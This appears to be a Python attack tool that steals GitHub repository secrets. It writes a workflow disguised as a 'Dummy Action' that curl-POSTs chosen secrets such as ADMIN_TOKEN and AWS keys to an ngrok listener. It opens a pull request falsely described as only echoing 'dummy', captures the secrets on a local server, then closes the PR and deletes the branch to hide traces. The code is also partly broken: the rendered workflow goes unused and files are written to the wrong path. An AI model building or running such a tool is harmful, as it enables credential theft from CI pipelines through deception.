import argparse


import os
import random
import string
from jinja2 import Template

import time
from git import Repo
from github import Github
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging
import ngrok
import threading

import signal
from functools import wraps
import os
import signal
import subprocess
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
import ngrok
import json


def render_action(environment, runs_on, url, keys):
    yaml_template = """
name: Dummy Action

on: [push]

jobs:
  build:
    runs-on: {{ runs_on }}
    {% if environment %}
    environment: {{ environment }}
    {% endif %}
    steps:
      - name: Run dummy command
        run: |
            echo running
            curl -X POST -d '{% raw %}{{% endraw %}{% for key in keys %}"{{ key }}": "{% raw %}${{{% endraw %} {{ key }} {% raw %}}}{% endraw %}"{% if not loop.last %}, {% endif %}{% endfor %}{% raw %}}{% endraw %}' {{ url }}
    """

    template = Template(yaml_template)
    rendered = template.render(
        environment=environment,
        runs_on=runs_on,
        url=url,
        keys=keys
    )
    return rendered


def get_port():
    port = random.randint(8081, 20000)
    return port


class TimeoutException(Exception):
    pass


def timeout(seconds):
    def decorator(func):
        def _handle_timeout(signum, frame):
            raise TimeoutException("Function call timed out")

        @wraps(func)
        def wrapper(*args, **kwargs):
            signal.signal(signal.SIGALRM, _handle_timeout)
            signal.alarm(seconds)
            try:
                result = func(*args, **kwargs)
            except TimeoutException:
                result = None
            finally:
                signal.alarm(0)
            return result
        return wrapper
    return decorator


# Example usage
@timeout(5)
def long_running_function():
    time.sleep(10)
    return "Finished"


# Define ANSI escape codes for colors
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"


def fmt_color(text, color):
    return f"{color}{text}{RESET}"


def print_color(text, color):
    print(fmt_color(text, color))


class HelloHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        body = bytes("Hello", "utf-8")
        self.protocol_version = "HTTP/1.1"
        self.send_response(200)
        self.send_header("Content-Length", len(body))
        self.end_headers()
        self.wfile.write(body)


yaml_content = """
name: Dummy Action

on: [push]

jobs:
build:
    runs-on: ubuntu-latest
    environment: production
    steps:
    - name: Run dummy command
    run: |
        echo running
        curl -X POST -d '{"env.ADMIN_TOKEN": "${{ env.ADMIN_TOKEN }}", "secrets.AWS_ACCESS_KEY_ID": "${{ secrets.ADMIN_TOKEN}}" }' https://31e9-31-154-163-162.ngrok-free.app
"""


def local_repo(localpath):
    # Initialize the repository
    repo = Repo(localpath)
    assert not repo.bare
    # print git repo owner and name
    # Get the URL of the 'origin' remote
    origin_url = repo.remotes.origin.url

    # Extract owner and repo name from the URL
    pattern = r'github\.com[:/](.*?)/(.*?)(?:\.git)?$'
    match = re.search(pattern, origin_url)

    if match:
        owner = match.group(1)
        repo_name = match.group(2)
        print(fmt_color(f"Repository: ", GREEN) +
              fmt_color(f"{owner}/{repo_name}", CYAN))
        return (repo, owner, repo_name)
    else:
        print_color(
            "Could not parse owner and repository name from the URL", RED)
        return None


def dump_action_yaml(action_file_path, yaml_content):
    os.makedirs(os.path.dirname(action_file_path), exist_ok=True)
    with open(action_file_path, "w") as f:
        f.write(yaml_content)


def create(args):

    port = get_port()
    ngrok_listener = start_ngrok(port=str(port))
    
    content = render_action(environment=args.env, runs_on="ubuntu-latest",
                            url=ngrok_listener.url, keys=args.val)
    # should be in another thread
    thread = threading.Thread(target=wait_for_response, args=(port))
      # Start the thread
    thread.start()
    
    print(f"Repo path: {args.path}")
    repo, owner, repo_name = local_repo(args.path)

    # Create and checkout the new branch
    random_suffix = ''.join(random.choices(
        string.ascii_lowercase + string.digits, k=8))
    branch_name = "prefix-" + random_suffix
    new_branch = repo.create_head(branch_name)
    new_branch.checkout()
    print(fmt_color(f"Branch created: ", GREEN) +
          fmt_color(f"{branch_name}", CYAN))

    # dump YAML content into action file
    action_file_path = os.path.join(
        args.path, ".github", "workflows", "dummy_action.yml")
    dump_action_yaml(args.path, yaml_content=yaml_content)
    print(fmt_color(f"Action file created: ", GREEN) +
          fmt_color(f"{action_file_path}", CYAN))

    # Stage and commit the changes
    repo.index.add([action_file_path])
    repo.index.commit("Add dummy GitHub action")

    # Create a pull request
    g = Github(args.gh_token)
    github_repo = g.get_repo(owner + "/" + repo_name)
    pr = github_repo.create_pull(
        title="Add dummy GitHub action",
        body="This PR adds a dummy GitHub action that echoes 'dummy'.",
        head=branch_name,
        base="main"  # or the default branch of your repo
    )

    print(fmt_color(f"Pull request created: ", GREEN) +
          fmt_color(f"{pr.html_url}", CYAN))
    
    thread.join()

    # close the pull request
    pr.edit(state="closed")
    print(fmt_color(f"Pull request closed: ", GREEN) +
          fmt_color(f"{pr.html_url}", CYAN))
    
    # delete the branch
    repo.delete_head(branch_name)
    print(fmt_color(f"Branch deleted: ", GREEN) +
          fmt_color(f"{branch_name}", CYAN))
    

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Hello, World!')
        elif self.path.startswith('/echo'):
            message = self.path.split('/echo/')[-1]
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(message.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        json_data = json.loads(post_data.decode())
        print(fmt_color("Received POST request with JSON data:", GREEN))
        print(json.dumps(json_data, indent=2))
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(post_data)


def run_server(port, handler=RequestHandler):
    server_address = ('', port)
    httpd = HTTPServer(server_address, handler)
    print(f'Starting HTTP server on port {port}')
    httpd.serve_forever()


def start_ngrok(port):
    listener = ngrok.forward(f"localhost:{port}", authtoken_from_env=True)
    print(f"Ingress established at: {listener.url()}")
    return listener


@timeout(60)
def wait_for_response(port):
    try:
        print(fmt_color("Server waiting for payload...", CYAN))
        run_server(port)
        return True
    except TimeoutException:
        print("TimeoutException Function call timed out")
        return False
    except KeyboardInterrupt:
        print('KeyboardInterrupt Stopping server...')
        return False
    except Exception as e:
        print(f"Exception: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description='Fetch Info from Github repository environment variables')
    subparsers = parser.add_subparsers(dest='cmd', help='Help...')

    create_parser = subparsers.add_parser('create', help='Fetch data')
    create_parser.add_argument(
        '--path', '-p', type=str, help='Local Git Repo Path', default=None)
    create_parser.add_argument(
        '--gh-token', '-t', type=str, help='Github API Token', default=None)
    # add argument for list of environment variables
    create_parser.add_argument('-v','--val', action='append' ,help='.secrets / .env values to fetch', required=True)
    create_parser.add_argument('-e','--env', type=str ,help='Github Environment to set in action file', default=None)

    create_parser.set_defaults(func=create)

    options = parser.parse_args()
    options.func(options)


if __name__ == '__main__':
    main()
